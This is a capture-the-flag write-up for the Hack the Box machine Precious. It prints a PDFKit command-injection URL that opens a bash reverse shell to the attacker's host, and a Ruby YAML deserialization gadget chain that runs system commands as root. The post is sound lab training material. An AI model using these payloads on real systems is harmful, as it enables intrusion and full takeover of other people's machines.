+++
author = "Nick"
categories = ["hack the box", "Easy"]
date = 2023-05-20T11:00:00.000Z
publishDate = 2023-05-20T11:00:00.000Z
description = "Precious is an Easy Difficulty Linux machine, that focuses on the Ruby language. It hosts a custom Ruby web application, using an outdated library, namely pdfkit, which is vulnerable to CVE-2022-25765, leading to an initial shell on the target machine. After a pivot using plaintext credentials that are found in a Gem repository config file, the box concludes with an insecure deserialization attack on a custom, outdated, Ruby script."
draft = false
thumbnail = "/images/precious/logo.png"
slug = "hack-the-box-precious"
summary = ""
tags = ["hack the box", "Easy", "Linux", "PDFKit", "Ruby", "Deserilization", "code review"]
title = "Hack the Box - Precious"
url = "/hack-the-box-precious"
+++

Today we are doing the Hack the Box machine Precious. This machine is listed as an Easy machine. 

We start by doing a basic `rustscan` of the system - 10.129.228.98:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Now we take a look at what's going on for the webservice. We are greeted with a page that says we can convert a web page to a PDF.

![](/images/precious/1.png)

So we point it at itself, but doesn't seem to be able to read it. So we host our own web server via `python3 -m http.server 80` and sure enough, it can convert that to a PDF. Trying a few more things but none seem to really get us anywhere in terms of extract information from the server itself. Next we run `strings` on the file and determine its made by `PDFKit 0.8.6`. Google shows an exploit and quite a few PoC's - (see)[https://duckduckgo.com/?q=pdfkit+exploit&atb=v332-1&ia=web].

So now that we can see a method for creating a reverse shell, we do just that. We craft a webpage with a shell on it. Trying multiple shells the one that eventually worked was this query:

```
http://10.10.14.2/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.2/4242 0>&1"`
```

I wasn't able to catch any `python` shells back and the `ruby` shells kept terminating unexpectedly - so if anyone out there knows why, let me know!

We set up our `netcat` listener and run the command.

![](/images/precious/2.png)

Once we're on the box, we transfer over `linpeas.sh` and let that do some enumeration. While that runs, we can manually enumerate a bit. We end up finding a file called `config` in the `~/.bundle` directory. Reading the contents of this file gives us credentials.

![](/images/precious/3.png)

We try these credentials for `SSH` and sure enough, they work! We are able to login as `henry` and get our `user.txt` flag!

![](/images/precious/user.png)

Now with the first flag down, we start to enumerate again. We run our standard `sudo -l` and see that we do have access to a file we can run.

![](/images/precious/4.png)

We are able to run `update_dependencies.rb` as `root`. So, we inspect this file.

![](/images/precious/5.png)

As we review this code, we see somethign that sticks out immediatly. A `YAML` file that is being read incorrectly. The application is using `YAML.load` which is unsafe. So, reminding myself that this is `Ruby` and not `Python`, do a quick check on `Yaml Deserialization` for `Ruby`. Turns out this is [indeed a thing](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and [multple sources](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/) of it as well!

Now, reading through these research documents we have an idea of what we need to do. We'll create a `dependencies.yml` file with our malicious code within. 

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cat /root/root.txt
         method_id: :resolve
```

Next we simply run the `update_dependencies.rb` file.

![](/images/precious/root.png)

There we are, the `root` flag!. After that, modifying the code to do whatever you want is easy. So, I re-ran the exploit again, but this time simply asking for a `root` shell. To do this, simply modify the `git_set` in the `dependencies.yml` file to as for `/bin/bash`. Poof. `Root` shell!

![](/images/precious/root2.png)

Another machine down. See ya'll next time!